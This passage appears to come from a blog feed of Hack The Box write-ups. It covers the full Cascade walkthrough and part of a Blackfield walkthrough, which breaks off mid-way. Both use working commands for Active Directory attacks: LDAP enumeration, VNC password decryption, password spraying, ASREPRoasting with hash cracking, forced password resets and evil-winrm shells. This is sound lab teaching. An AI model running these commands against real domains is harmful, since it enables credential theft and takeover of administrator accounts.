        <tag>amsi-bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Cascade (Windows Medium)</title>
    <url>/2025/03/05/Cascade/</url>
    <content><![CDATA[
Cascade is a medium Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson, which gives access to a TightVNC registry backup. The backup is decrypted to gain the password for s.smith. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the ArkSvc account. This account belongs to the AD Recycle Bin group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator. 
Initial NmapPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-05 15:34:05Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack ttl 127636/tcp   open  tcpwrapped    syn-ack ttl 1273268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped    syn-ack ttl 1275985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

LDAPChecking if Anonymous LDAP binding is enabled.
$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;DC=cascade,DC=local&quot; &#x27;(objectClass=person)&#x27;&lt;SNIP&gt;name: Ryan ThompsonobjectGUID:: LfpD6qngUkupEy9bFXBBjA==userAccountControl: 66048badPwdCount: 2codePage: 0countryCode: 0badPasswordTime: 133856782280227955lastLogoff: 0lastLogon: 133856660661946343pwdLastSet: 132230718862636251primaryGroupID: 513objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==accountExpires: 9223372036854775807logonCount: 2sAMAccountName: r.thompsonsAMAccountType: 805306368userPrincipalName: r.thompson@cascade.localobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=localdSCorePropagationData: 20200126183918.0ZdSCorePropagationData: 20200119174753.0ZdSCorePropagationData: 20200119174719.0ZdSCorePropagationData: 20200119174508.0ZdSCorePropagationData: 16010101000000.0ZlastLogonTimestamp: 133856660661946343msDS-SupportedEncryptionTypes: 0cascadeLegacyPwd: &lt;SNIP&gt;&lt;SNIP&gt;
This reveals a cascadeLegacyPwd for r.thompson. We can use base64 to decode this perhaps.
$ echo &lt;SNIP&gt; | base64 -d&lt;SNIP&gt;

SMBWe can try r.thompson and the password we have to see what shares are available.
$ nxc smb 10.10.10.182 -u r.thompson -p &lt;SNIP&gt; --sharesSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:&lt;SNIP&gt;SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated sharesSMB         10.10.10.182    445    CASC-DC1         Share           Permissions     RemarkSMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote AdminSMB         10.10.10.182    445    CASC-DC1         Audit$SMB         10.10.10.182    445    CASC-DC1         C$                              Default shareSMB         10.10.10.182    445    CASC-DC1         Data            READSMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPCSMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server shareSMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer DriversSMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
Getting a mix on tools and using smbmap we see whats in the Data share.
$ smbmap -H 10.10.10.182 -u r.thompson -p &lt;SNIP&gt; -R Data[+] IP: 10.10.10.182:445	Name: casc-dc1	Disk                                                  	Permissions	Comment	----                                                  	-----------	-------	Data                                              	READ ONLY		.\Data\*	dr--r--r--                0 Tue Jan 28 16:05:51 2020	.	dr--r--r--                0 Tue Jan 28 16:05:51 2020	..	dr--r--r--                0 Sun Jan 12 19:45:14 2020	Contractors	dr--r--r--                0 Sun Jan 12 19:45:10 2020	Finance	dr--r--r--                0 Tue Jan 28 12:04:51 2020	IT	dr--r--r--                0 Sun Jan 12 19:45:20 2020	Production	dr--r--r--                0 Sun Jan 12 19:45:16 2020	Temps	.\Data\IT\*	dr--r--r--                0 Tue Jan 28 12:04:51 2020	.	dr--r--r--                0 Tue Jan 28 12:04:51 2020	..	dr--r--r--                0 Tue Jan 28 12:00:30 2020	Email Archives	dr--r--r--                0 Tue Jan 28 12:04:51 2020	LogonAudit	dr--r--r--                0 Tue Jan 28 18:53:04 2020	Logs	dr--r--r--                0 Tue Jan 28 16:06:59 2020	Temp	.\Data\IT\Email Archives\*	dr--r--r--                0 Tue Jan 28 12:00:30 2020	.	dr--r--r--                0 Tue Jan 28 12:00:30 2020	..	fr--r--r--             2522 Tue Jan 28 12:00:30 2020	Meeting_Notes_June_2018.html	.\Data\IT\Logs\*	dr--r--r--                0 Tue Jan 28 18:53:04 2020	.	dr--r--r--                0 Tue Jan 28 18:53:04 2020	..	dr--r--r--                0 Tue Jan 28 18:53:04 2020	Ark AD Recycle Bin	dr--r--r--                0 Tue Jan 28 18:56:00 2020	DCs	.\Data\IT\Logs\Ark AD Recycle Bin\*	dr--r--r--                0 Tue Jan 28 18:53:04 2020	.	dr--r--r--                0 Tue Jan 28 18:53:04 2020	..	fr--r--r--             1303 Tue Jan 28 19:19:11 2020	ArkAdRecycleBin.log	.\Data\IT\Logs\DCs\*	dr--r--r--                0 Tue Jan 28 18:56:00 2020	.	dr--r--r--                0 Tue Jan 28 18:56:00 2020	..	fr--r--r--             5967 Sun Jan 26 16:22:05 2020	dcdiag.log	.\Data\IT\Temp\*	dr--r--r--                0 Tue Jan 28 16:06:59 2020	.	dr--r--r--                0 Tue Jan 28 16:06:59 2020	..	dr--r--r--                0 Tue Jan 28 16:06:55 2020	r.thompson	dr--r--r--                0 Tue Jan 28 14:00:05 2020	s.smith	.\Data\IT\Temp\s.smith\*	dr--r--r--                0 Tue Jan 28 14:00:05 2020	.	dr--r--r--                0 Tue Jan 28 14:00:05 2020	..	fr--r--r--             2680 Tue Jan 28 14:00:01 2020	VNC Install.reg

VNC Registry FileThe VNC Install.reg was the only thing that held any real data we could use. After downloading it and opening it we see a password in hex for TightVNC.
Using a little trick I found on github for VNCDecrypt, I can decrpyt this hex password.
$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv00000000  73 54 33 33 33 76 65 32                           |&lt;SNIP&gt;|00000008

Password SprayingAfter getting this password, we try to spray the domain and came out successful.
$ nxc smb 10.10.10.182 -u users.lst -p &lt;SNIP&gt;SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:&lt;SNIP&gt; STATUS_LOGON_FAILURESMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:&lt;SNIP&gt; STATUS_LOGON_FAILURESMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:&lt;SNIP&gt;
We got a hit on s.smith, so we can see what else they might have access to via SMB.

SMasHing SMB with s.smithLooking into shares we see we have access the a Audit Share.
$ smbmap -H 10.10.10.182 -u s.smith -p &lt;SNIP&gt;[+] IP: 10.10.10.182:445	Name: casc-dc1	Disk                                                  	Permissions	Comment	----                                                  	-----------	-------	ADMIN$                                            	NO ACCESS	Remote Admin	Audit$                                            	READ ONLY		C$                                                	NO ACCESS	Default share	Data                                              	READ ONLY		IPC$                                              	NO ACCESS	Remote IPC	NETLOGON                                          	READ ONLY	Logon server share	print$                                            	READ ONLY	Printer Drivers	SYSVOL                                            	READ ONLY	Logon server share
Looking into this share we have a couple of files and maybe a custom exe file.
$ smbmap -H 10.10.10.182 -u s.smith -p &lt;SNIP&gt; -R &#x27;Audit$&#x27;[+] IP: 10.10.10.182:445	Name: casc-dc1	Disk                                                  	Permissions	Comment	----                                                  	-----------	-------	Audit$                                            	READ ONLY		.\Audit$\*	dr--r--r--                0 Wed Jan 29 12:01:26 2020	.	dr--r--r--                0 Wed Jan 29 12:01:26 2020	..	fr--r--r--            13312 Tue Jan 28 15:47:08 2020	CascAudit.exe	fr--r--r--            12288 Wed Jan 29 12:01:26 2020	CascCrypto.dll	dr--r--r--                0 Tue Jan 28 15:43:18 2020	DB	fr--r--r--               45 Tue Jan 28 17:29:47 2020	RunAudit.bat	fr--r--r--           363520 Tue Jan 28 14:42:18 2020	System.Data.SQLite.dll	fr--r--r--           186880 Tue Jan 28 14:42:18 2020	System.Data.SQLite.EF6.dll	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x64	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x86	.\Audit$\DB\*	dr--r--r--                0 Tue Jan 28 15:43:18 2020	.	dr--r--r--                0 Tue Jan 28 15:43:18 2020	..	fr--r--r--            24576 Tue Jan 28 15:43:18 2020	Audit.db	.\Audit$\x64\*	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..	fr--r--r--          1639936 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll	.\Audit$\x86\*	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..	fr--r--r--          1246720 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll

Source Code AnalysisWe can download CascAudit.exe and see what thats about. We get it to our Windows VM and open it in dnSpy, and look at the MainModule.
This shows us a part of the executable that uses sqlite to create an account over LDAP, I suppose. As well as a function Crypto that wasnâ€™t mentioned in the code. So it must be in a dll on the share. Guess weâ€™ll go find more in the Audit Share. We can grab the CascCrypto.dll and Audit.db and check these out. 
# Audit.db$ sqlite3 10.10.10.182-Audit_DB_Audit.db &#x27;.dump&#x27;\PRAGMA foreign_keys=OFF;BEGIN TRANSACTION;CREATE TABLE IF NOT EXISTS &quot;Ldap&quot; (	&quot;Id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,	&quot;uname&quot;	TEXT,	&quot;pwd&quot;	TEXT,	&quot;domain&quot;	TEXT);INSERT INTO Ldap VALUES(1,&#x27;ArkSvc&#x27;,&#x27;&lt;BASE64&gt;&#x27;,&#x27;cascade.local&#x27;);CREATE TABLE IF NOT EXISTS &quot;Misc&quot; (	&quot;Id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,&lt;SNIP&gt;
So we have a hash for the user ArkSvc. Next we look at the dll we got back in dnSpy.We have the function Crypto and looking it over we see were using AES. Doing some research and looking at cipher mode CBC as mention in the dll code (aes.Mode = CipherMode.CBC;),we first we need to install pyaes (apt install python-pyaes). Then use python to decrypt the password we have from the sqlite database. 
$ python3Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import pyaes&gt;&gt;&gt; from base64 import b64decode&gt;&gt;&gt; key = b&#x27;KEY&#x27;&gt;&gt;&gt; iv = b&#x27;IV&#x27;&gt;&gt;&gt; aes = pyaes.AESModeOfOperationCBC(key, iv = iv)&gt;&gt;&gt; decrypted = aes.decrypt(b64decode(&#x27;&lt;BASE64&gt;&#x27;))&gt;&gt;&gt; print(decrypted.decode())&lt;SNIP&gt;&gt;&gt;&gt;
We got the password for arksvc. We can check our access with nxc.
$ nxc winrm 10.10.10.182 -u arksvc -p &lt;SNIP&gt;WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:&lt;SNIP&gt; (Pwn3d!)
Lets get access and snoop around. 
Shell as arksvc$ evil-winrm -i 10.10.10.182 -u arksvc -p &lt;SNIP&gt;&lt;SNIP&gt;*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /groupsGROUP INFORMATION-----------------Group Name                                  Type             SID                                            Attributes=========================================== ================ ============================================== ===============================================================Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled groupCASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local GroupNT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group

We see were in the AD Recycle Bin Group, and looking online we find a github stating that the Group has the permissions to read deleted AD objects. We can try to see if there is anything that has been deleted.
PrivEsc*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter &#x27;isDeleted -eq $true&#x27; -includeDeletedObjects -Properties *&lt;SNIP&gt;accountExpires                  : 9223372036854775807badPasswordTime                 : 0badPwdCount                     : 0CanonicalName                   : cascade.local/Deleted Objects/TempAdmin                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059cascadeLegacyPwd                : &lt;BASE64&gt;CN                              : TempAdmin                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059codePage                        : 0countryCode                     : 0Created                         : 1/27/2020 3:23:08 AM&lt;SNIP&gt;
We happen to have another cascadeLegacyPwd we can decode.
$ echo &lt;BASE64&gt;| base64 -d&lt;SNIP&gt;


Seeing as this was for the TempAdmin, we can try Administrator with this password.
$ evil-winrm -i 10.10.10.182 -u Administrator -p &lt;SNIP&gt;Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami;hostnamecascade\administratorCASC-DC1

]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>SMB</tag>
        <tag>.NET</tag>
        <tag>AD Recycle Bin Group</tag>
        <tag>VNCDecrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>Blackfield (Windows Hard)</title>
    <url>/2025/02/24/blackfield/</url>
    <content><![CDATA[
Backfield is a hard Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. The user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access a SMB share containing forensics artifacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator. 
NmapPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-28 22:58:26Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack ttl 127593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.03268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPCService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

SMBLooking into shares:
nxc smb blackfield.local -u Guest -p &#x27;&#x27; --sharesSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Guest:SMB         10.10.10.192    445    DC01             [*] Enumerated sharesSMB         10.10.10.192    445    DC01             Share           Permissions     RemarkSMB         10.10.10.192    445    DC01             -----           -----------     ------SMB         10.10.10.192    445    DC01             ADMIN$                          Remote AdminSMB         10.10.10.192    445    DC01             C$                              Default shareSMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPCSMB         10.10.10.192    445    DC01             NETLOGON                        Logon server shareSMB         10.10.10.192    445    DC01             profiles$       READSMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share

Since Guest was enabled, I tried getting users by rid bruteforcing. This gave us ALOT of users.
$ nxc smb blackfield.local -u Guest -p &#x27;&#x27; --rid-brute&lt;SNIP&gt;SMB         10.10.10.192    445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1101: BLACKFIELD\DnsAdmins (SidTypeAlias)SMB         10.10.10.192    445    DC01             1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)SMB         10.10.10.192    445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)SMB         10.10.10.192    445    DC01             1104: BLACKFIELD\support (SidTypeUser)SMB         10.10.10.192    445    DC01             1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)SMB         10.10.10.192    445    DC01             1106: BLACKFIELD\BLACKFIELD538365 (SidTypeUser)&lt;SNIP&gt;SMB         10.10.10.192    445    DC01             1411: BLACKFIELD\BLACKFIELD653097 (SidTypeUser)SMB         10.10.10.192    445    DC01             1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)SMB         10.10.10.192    445    DC01             1413: BLACKFIELD\svc_backup (SidTypeUser)SMB         10.10.10.192    445    DC01             1414: BLACKFIELD\lydericlefebvre (SidTypeUser)SMB         10.10.10.192    445    DC01             1415: BLACKFIELD\PC01$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1416: BLACKFIELD\PC02$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1417: BLACKFIELD\PC03$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1418: BLACKFIELD\PC04$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1419: BLACKFIELD\PC05$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1420: BLACKFIELD\PC06$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1421: BLACKFIELD\PC07$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1422: BLACKFIELD\PC08$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1423: BLACKFIELD\PC09$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1424: BLACKFIELD\PC10$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1425: BLACKFIELD\PC11$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1426: BLACKFIELD\PC12$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1427: BLACKFIELD\PC13$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)SMB         10.10.10.192    445    DC01             1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)

KERBEROSFrom there I validated users via kerbrute. All of them seemed to be valid so thats a drag.
$ kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.list    __             __               __   / /_____  _____/ /_  _______  __/ /____  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/Version: v1.0.3 (9dad6e1) - 02/28/25 - Ronnie Flathers @ropnop2025/02/28 11:30:45 &gt;  Using KDC(s):2025/02/28 11:30:45 &gt;  	10.10.10.192:882025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 Administrator@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 audit2020@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 BLACKFIELD189208@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 DC01$@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 Guest@blackfield.local2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 support@blackfield.local&lt;SNIP&gt;2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 svc_backup@blackfield.local2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 BLACKFIELD438814@blackfield.local2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 BLACKFIELD653097@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC10$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC07$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 SRV-WEB$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC09$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC13$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC11$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC05$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC06$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC08$@blackfield.local2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC12$@blackfield.local2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-EXCHANGE$@blackfield.local2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-FILE$@blackfield.local2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-INTRANET$@blackfield.local2025/02/28 11:33:38 &gt;  Done! Tested 333 usernames (332 valid) in 172.662 seconds
Never the less, I wanted to see if anyone has PRE-AUTH DISABLED. We got one user support.
$ GetNPUsers.py -dc-ip 10.10.10.192 -dc-host blackfield.local -usersfile users.list -no-pass &#x27;blackfield.local/&#x27;[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User Guest doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User DC01$ doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User audit2020 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8&lt;SNIP&gt;[-] User BLACKFIELD764430 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD538365 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD189208 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD404458 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User BLACKFIELD706381 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set&lt;SNIP&gt;
Cracking this with hashcat gives us a clear text password.
$ hashcat support.hash /usr/share/wordlists/rockyou.txt --showHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:18200 | Kerberos 5, etype 23, AS-REP | Network ProtocolNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8d05d7363d86f881bc81256c8271b7f1985c&lt;SNIP&gt;4ea9c8feea6ec223314fc227ee3c240d7f03998089456763f2cdb4aace7a32d41f6f9b9b11d2553afdb985948a6f58e2366b804:&lt;SNIP&gt;

BloodHoundNow we have some credentials to get a bloodhound dump.
$ nxc ldap 10.10.10.192 -u support -p &#x27;&lt;SNIP&gt;&#x27; --dns-server 10.10.10.192 --bloodhound -c AllSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)LDAP        10.10.10.192    389    DC01             [+] BLACKFIELD.local\support:&lt;SNIP&gt;LDAP        10.10.10.192    389    DC01             Resolved collection methods: rdp, acl, container, session, trusts, psremote, dcom, objectprops, localadmin, groupLDAP        10.10.10.192    389    DC01             Done in 00M 08SLDAP        10.10.10.192    389    DC01             Compressing output into /home/jaybit/.nxc/logs/DC01_10.10.10.192_2025-02-28_114320_bloodhound.zip
Looking at our pwnd user support, we see we have ForceChangePassword over audit2020. So using bloodyAD(MyFaV), we change his password.
$ ./bloodyAD.py -v DEBUG -u &#x27;support&#x27; -p &#x27;&lt;SNIP&gt;&#x27; --host 10.10.10.192 -d blackfield.local set password audit2020 Password123[*] Trying to connect to 10.10.10.192...[+] Connection successful[+] Password changed successfully!
Now back to SMB and see what he has access to.
SMB Round 2Running NetExec shows we have READ to the forencis share.
$ nxc smb blackfield.local -u audit2020 -p Password123 --sharesSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123SMB         10.10.10.192    445    DC01             [*] Enumerated sharesSMB         10.10.10.192    445    DC01             Share           Permissions     RemarkSMB         10.10.10.192    445    DC01             -----           -----------     ------SMB         10.10.10.192    445    DC01             ADMIN$                          Remote AdminSMB         10.10.10.192    445    DC01             C$                              Default shareSMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPCSMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server shareSMB         10.10.10.192    445    DC01             profiles$       READSMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
Looking into this share with impacket-smbclient showed us a couple to choose from.
$ impacket-smbclient -dc-ip 10.10.10.192 &#x27;blackfield.local/audit2020:Password123@blackfield.local&#x27;Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companiesType help for list of commands# use forensic# lsdrw-rw-rw-          0  Sun Feb 23 09:10:16 2020 .drw-rw-rw-          0  Sun Feb 23 09:10:16 2020 ..drw-rw-rw-          0  Sun Feb 23 12:14:37 2020 commands_outputdrw-rw-rw-          0  Thu May 28 15:29:24 2020 memory_analysisdrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 tools
This looks like a dump of some sort from the DC based on the tools and commands_output directory.
Tools Directory:
# lsdrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 .drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 ..drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 sleuthkit-4.8.0-win32drw-rw-rw-          0  Fri Feb 28 16:30:35 2020 sysinternalsdrw-rw-rw-          0  Fri Feb 28 16:30:35 2020 volatility
Commands_output Directory:
